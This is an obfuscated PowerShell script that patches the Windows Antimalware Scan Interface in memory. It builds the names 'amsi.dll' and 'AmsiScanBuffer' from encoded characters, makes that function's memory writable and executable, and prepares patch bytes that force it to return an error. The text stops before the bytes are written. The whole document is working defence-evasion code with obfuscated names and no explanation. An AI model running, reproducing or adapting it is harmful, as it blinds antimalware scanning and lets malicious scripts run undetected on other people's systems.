$mvzkx = @"
using System;
using System.Runtime.InteropServices;
public class mvzkx {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr qxysni, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $mvzkx

$pgspoyx = [mvzkx]::LoadLibrary("$(('áms'+'í.d'+'ll').NorMaLIZE([CHaR]([byTE]0x46)+[ChAR]([bYTe]0x6f)+[cHAR](114*26/26)+[CHAr](109+62-62)+[cHaR](68)) -replace [ChAr]([BYTE]0x5c)+[ChAr](99+13)+[CHAr](123+33-33)+[cHAR]([BytE]0x4d)+[CHaR](110*65/65)+[ChAr]([Byte]0x7d))")
$ebqbyt = [mvzkx]::GetProcAddress($pgspoyx, "$([ChAr]([ByTe]0x41)+[chAr]([BYTe]0x6d)+[chAr](37+78)+[Char]([bYtE]0x69)+[CHAr]([BytE]0x53)+[CHAR](99*97/97)+[CHar](97+40-40)+[ChAR]([ByTE]0x6e)+[chAR](66+34-34)+[cHar](117)+[chAR](102*11/11)+[cHaR](102)+[cHaR]([bytE]0x65)+[CHaR]([BYTE]0x72))")
$p = 0
$vswd = "0xB8"
$kbnf = "0x57"
$hkgq = "0x00"
$gnie = "0x07"
$vuun = "0x80"
$qsnk = "0xC3"
[mvzkx]::VirtualProtect($ebqbyt, [uint32]5, 0x40, [ref]$p)
$oylua = [Byte[]] ($vswd,$kbnf,$hkgq,$gnie,+$vuun,+$qsnk)
